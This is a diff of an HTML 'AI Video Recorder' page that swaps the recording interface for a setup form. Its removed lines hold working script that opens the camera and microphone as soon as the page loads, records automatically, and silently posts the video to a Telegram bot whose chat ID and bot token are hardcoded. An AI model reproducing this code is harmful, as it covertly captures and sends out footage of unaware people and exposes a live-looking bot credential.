@@ -3,252 +3,84 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AI Video Recorder</title>
+    <title>AI Video Recorder - Options</title>
     <style>
-        /* General Styling */
         body {
             font-family: 'Poppins', sans-serif;
-            background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
+            background: linear-gradient(135deg, #1e3c72, #2a5298);
             color: white;
+            text-align: center;
             margin: 0;
-            padding: 0;
+            padding: 20px;
             display: flex;
             flex-direction: column;
             align-items: center;
-            min-height: 100vh;
-            overflow: hidden;
+            justify-content: center;
+            height: 100vh;
         }
 
         h1 {
-            font-size: 2rem;
-            margin: 20px 0;
-            text-align: center;
+            margin-bottom: 20px;
         }
 
-        .container {
-            width: 90%;
-            max-width: 1200px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 20px;
-        }
-
-        .video-container {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 10px;
-            width: 100%;
-        }
-
-        video {
-            width: 100%;
-            max-width: 600px;
-            border: 4px solid white;
-            border-radius: 8px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.5);
-        }
-
-        .controls {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 15px;
-        }
-
-        .dropdown {
-            display: flex;
-            flex-direction: column;
-            gap: 10px;
+        .form-container {
             background: rgba(255, 255, 255, 0.1);
-            padding: 15px;
-            border-radius: 8px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
-            width: 100%;
-            max-width: 600px;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
         }
 
         label {
+            font-size: 1.2rem;
+            margin: 10px 0;
+            display: block;
+        }
+
+        select, button {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
             font-size: 1rem;
-            margin-bottom: 5px;
+            border-radius: 5px;
+            border: none;
         }
 
         select {
-            width: 100%;
-            padding: 10px;
-            font-size: 1rem;
-            border-radius: 5px;
-            border: none;
             background: #4e54c8;
             color: white;
-            cursor: pointer;
-        }
-
-        select:hover {
-            background: #8f94fb;
         }
 
         button {
-            padding: 12px 24px;
             background: #ff5f6d;
-            border: none;
-            border-radius: 5px;
             color: white;
-            font-size: 1rem;
             cursor: pointer;
-            transition: background 0.3s ease;
+            transition: background 0.3s;
         }
 
         button:hover {
             background: #ffc371;
         }
-
-        #countdown {
-            font-size: 1.2rem;
-            font-weight: bold;
-            margin-top: 10px;
-        }
-
-        .footer {
-            margin-top: auto;
-            font-size: 0.8rem;
-            color: #ccc;
-        }
     </style>
 </head>
 <body>
-    <h1>AI Video Recorder</h1>
-    <div class="container">
-        <div class="video-container">
-            <video id="livePreview" autoplay muted></video>
-            <video id="videoPlayer" controls></video>
-        </div>
+    <h1>AI Video Recorder - Setup</h1>
+    <div class="form-container">
+        <form id="optionsForm" action="camera.html" method="get">
+            <label for="duration">Recording Duration:</label>
+            <select id="duration" name="duration">
+                <option value="30">30 seconds</option>
+                <option value="60" selected>60 seconds</option>
+                <option value="120">120 seconds</option>
+            </select>
 
-        <div class="controls">
-            <div id="countdown">Recording time left: 60 seconds</div>
+            <label for="resolution">Resolution:</label>
+            <select id="resolution" name="resolution">
+                <option value="720">720p</option>
+                <option value="1080">1080p</option>
+            </select>
 
-            <div class="dropdown">
-                <label for="duration">Recording Duration:</label>
-                <select id="duration">
-                    <option value="30">30 seconds</option>
-                    <option value="60" selected>60 seconds</option>
-                    <option value="120">120 seconds</option>
-                </select>
-
-                <label for="resolution">Resolution:</label>
-                <select id="resolution">
-                    <option value="720">720p</option>
-                    <option value="1080">1080p</option>
-                </select>
-            </div>
-
-            <button id="toggleCamera">Switch to Rear Camera</button>
-        </div>
+            <button type="submit">Start Recording</button>
+        </form>
     </div>
-
-    <div class="footer">© 2025 AI Video Recorder</div>
-
-    <script>
-        let useRearCamera = false;
-        let mediaRecorder;
-        let stream;
-        let chunks = [];
-        let countdownInterval;
-
-        async function startStream() {
-            try {
-                const resolution = document.getElementById('resolution').value;
-                stream = await navigator.mediaDevices.getUserMedia({
-                    video: {
-                        facingMode: useRearCamera ? 'environment' : 'user',
-                        width: resolution === '1080' ? 1920 : 1280,
-                        height: resolution === '1080' ? 1080 : 720
-                    },
-                    audio: true
-                });
-                document.getElementById('livePreview').srcObject = stream;
-                startRecording();
-            } catch (error) {
-                console.error('Error accessing camera or microphone:', error);
-            }
-        }
-
-        function startRecording() {
-            chunks = [];
-            const duration = parseInt(document.getElementById('duration').value) * 1000;
-            mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm; codecs=vp9' });
-
-            mediaRecorder.ondataavailable = (event) => {
-                if (event.data.size > 0) chunks.push(event.data);
-            };
-
-            mediaRecorder.onstop = () => {
-                const blob = new Blob(chunks, { type: 'video/webm' });
-                document.getElementById('videoPlayer').src = URL.createObjectURL(blob);
-                document.getElementById('videoPlayer').load();
-                document.getElementById('videoPlayer').play();
-                sendToTelegram(blob); // Automatically send video to Telegram
-            };
-
-            mediaRecorder.start();
-            startCountdown(duration / 1000);
-
-            setTimeout(() => {
-                if (mediaRecorder.state !== 'inactive') mediaRecorder.stop();
-                stream.getTracks().forEach((track) => track.stop());
-            }, duration);
-        }
-
-        function startCountdown(seconds) {
-            const countdownElement = document.getElementById('countdown');
-            let remaining = seconds;
-
-            countdownInterval = setInterval(() => {
-                countdownElement.textContent = `Recording time left: ${remaining} seconds`;
-                remaining--;
-
-                if (remaining < 0) {
-                    clearInterval(countdownInterval);
-                    countdownElement.textContent = 'Recording finished.';
-                }
-            }, 1000);
-        }
-
-        function sendToTelegram(blob) {
-            const chatId = '7361816575';
-            const botToken = '7911158066:AAH8zYHwLkLWs4FZwjbEEMpNf2zgdoj2WoI';
-            const formData = new FormData();
-            formData.append('chat_id', chatId);
-            formData.append('video', blob, 'video.webm');
-
-            fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
-                method: 'POST',
-                body: formData
-            })
-                .then(response => {
-                    if (response.ok) {
-                        console.log('Video sent successfully!');
-                    } else {
-                        console.error('Failed to send video:', response.statusText);
-                    }
-                })
-                .catch(error => {
-                    console.error('Error sending video:', error);
-                });
-        }
-
-        document.getElementById('toggleCamera').addEventListener('click', () => {
-            useRearCamera = !useRearCamera;
-            if (mediaRecorder && mediaRecorder.state === 'recording') {
-                mediaRecorder.stop();
-                stream.getTracks().forEach((track) => track.stop());
-            }
-            startStream();
-        });
-
-        // Start the stream when the page loads
-        startStream();
-    </script>
 </body>
 </html>
